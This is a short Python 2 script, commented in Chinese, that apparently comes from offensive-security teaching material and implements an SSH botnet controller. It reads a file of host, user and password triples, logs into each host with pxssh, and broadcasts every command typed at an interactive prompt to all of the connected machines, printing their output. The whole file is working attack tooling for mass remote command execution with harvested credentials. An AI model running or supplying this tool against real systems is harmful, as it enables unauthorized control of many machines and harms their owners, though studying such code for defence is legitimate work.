#!/usr/bin/python
#coding=utf-8
import optparse
from pexpect import pxssh
import optparse

botNet=[]
#定义一个用于存放host的列表以便判断当前host之前是否已经添加进botNet中了
hosts = []

#定义一个客户端的类
class Client(object):
	"""docstring for Client"""
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.connect()

	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host,self.user,self.password)
			return s
		except Exception, e:
			print e
			print '[-] Error Connecting'

	def send_command(self, cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before

def botnetCommand(cmd, k):
	for client in botNet:	
		output=client.send_command(cmd)
		#若k为True即最后一台主机发起请求后就输出，否则输出会和之前的重复
		if k:
			print '[*] Output from '+client.host
			print '[+] '+output+'\n'

def addClient(host,user,password):
	if len(hosts) == 0:
		hosts.append(host)
		client=Client(host,user,password)
		botNet.append(client)
	else:
		t = True
		#遍历查看host是否存在hosts列表中，若不存在则进行添加操作
		for h in hosts:
			if h == host:
				t = False
		if t:
			hosts.append(host)
			client=Client(host,user,password)
			botNet.append(client)

def main():
	parser=optparse.OptionParser('Usage : ./botNet.py -f <botNet file>')
	parser.add_option('-f',dest='file',type='string',help='specify botNet file')
	(options,args)=parser.parse_args()
	file = options.file
	if file==None:
		print parser.usage
		exit(0)
	
	#计算文件行数，不能和下面的f用同一个open()否则会出错
	count = len(open(file,'r').readlines())

	while True:
		cmd=raw_input("<SSH> ")
		k = 0
		f = open(file,'r')
		for line in f.readlines():
			line = line.strip('\n')
			host = line.split(':')[0]
			user = line.split(':')[1]
			password = line.split(':')[2]

			k += 1

			#这里需要判断是否到最后一台主机调用函数，因为命令的输出结果会把前面的所有结果都输出从而会出现重复输出的情况
			if k < count:
				addClient(host,user,password)
				#不是最后一台主机请求，则先不输出命令结果
				botnetCommand(cmd,False)
			else:
				addClient(host,user,password)
				#最后一台主机请求，则可以输出命令结果
				botnetCommand(cmd,True)
	
if __name__ =='__main__':
	main()
